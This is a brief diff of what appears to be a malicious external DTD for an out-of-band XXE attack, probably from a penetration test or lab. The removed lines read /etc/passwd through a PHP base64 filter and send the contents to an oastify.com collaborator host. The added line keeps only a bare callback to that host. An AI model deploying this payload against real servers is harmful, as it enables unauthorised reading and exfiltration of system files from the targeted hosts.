@@ -1,2 +1,1 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % test '<!ENTITY &#37 send SYSTEM "http://c4hyqc8aimqpyrqvq5efoqanaeg54vsk.oastify.com/?%file;">'>
+<!ENTITY % test '<!ENTITY &#37 send SYSTEM "http://c4hyqc8aimqpyrqvq5efoqanaeg54vsk.oastify.com">'>
